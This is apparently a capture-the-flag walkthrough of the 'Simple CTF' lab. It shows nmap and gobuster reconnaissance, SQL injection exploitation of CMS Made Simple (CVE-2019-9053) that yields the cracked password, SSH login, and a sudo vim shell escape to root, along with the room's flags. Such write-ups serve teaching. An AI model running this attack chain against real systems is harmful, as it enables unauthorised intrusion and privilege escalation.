# Simple CTF

+ **How many services are running under port 1000?**
  	```
  	wuvel@wuvel:~$ nmap -A -T5 -oN nmap/initial 10.10.33.186

  	Nmap scan report for 10.10.33.186
	Host is up (0.23s latency).
	Not shown: 997 filtered ports
	PORT     STATE SERVICE VERSION
	21/tcp   open  ftp     vsftpd 3.0.3
	80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Apache2 Ubuntu Default Page: It works
	2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
	|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
	|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  	```

  	There is **2** services.

+ **What is running on the higher port?**
	```
  	wuvel@wuvel:~$ nmap -A -T5 -oN nmap/initial 10.10.33.186

  	Nmap scan report for 10.10.33.186
	Host is up (0.23s latency).
	Not shown: 997 filtered ports
	PORT     STATE SERVICE VERSION
	21/tcp   open  ftp     vsftpd 3.0.3
	80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Apache2 Ubuntu Default Page: It works
	2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
	|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
	|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  	```

  	It is **ssh** services.

+ **What's the CVE you're using against the application?**
	```
	wuvel@wuvel:~$ gobuster dir -u 10.10.33.186 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

	===============================================================
	Gobuster v3.0.1
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
	===============================================================
	[+] Url:            http://10.10.33.186
	[+] Threads:        50
	[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	[+] Status codes:   200,204,301,302,307,401,403
	[+] User Agent:     gobuster/3.0.1
	[+] Timeout:        10s
	===============================================================
	2020/05/24 21:17:42 Starting gobuster
	===============================================================
	/simple (Status: 301) 

	#It's a CMS Made Simpe.
	```

	After we look up for CMS Made Simple Vuln, i found the CVE was **CVE-2019-9053**.

+ **To what kind of vulnerability is the application vulnerable?**
	```
	CMS Made Simple versions prior to 2.2.10 suffer from a remote SQL injection vulnerability.

	#from https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html
	```

	It's a **SQLi** Vuln.

+ **What's the password?**
	```
	#Download the CVE, Run with python2.

	[+] Salt for password found: 1dac0d92e9fa6bb2
	[+] Username found: mitch
	[+] Email found: admin@admin.com
	[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
	[+] Password cracked: secret
	```

	The password is **secret**.

+ **Where can you login with the details obtained?**
	```
	wuvel@wuvel:~$ ssh mitch@10.10.33.186 -p 2222

	The authenticity of host '[10.10.33.186]:2222 ([10.10.33.186]:2222)' can't be established.
	ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '[10.10.33.186]:2222' (ECDSA) to the list of known hosts.
	mitch@10.10.33.186's password: 
	Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage

	0 packages can be updated.
	0 updates are security updates.

	Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
	$
	```

	We can login thru **SSH**.

+ **What's the user flag?**
	```
	$ cat user.txt  

	G00d j0b, keep up!
	```

	It's **G00d j0b, keep up!**.

+ **Is there any other user in the home directory? What's its name?**
	```
	$ cd ..
	$ ls
	mitch  sunbath
	$ 
	```

	The other users was **sunbath**.

+ **What can you leverage to spawn a privileged shell?**
	```
	mitch@Machine:~$ sudo -l

	User mitch may run the following commands on Machine:
	    (root) NOPASSWD: /usr/bin/vim
	```

	We can privesc using **vim**.

+ **What's the root flag?**
	```
	mitch@Machine:~$ sudo vim -c ':!/bin/sh'

	# whoami
	root
	# cd /root
	# ls
	root.txt
	# cat root.txt  
	W3ll d0n3. You made it!
	```

	Root flag is **W3ll d0n3. You made it!**.
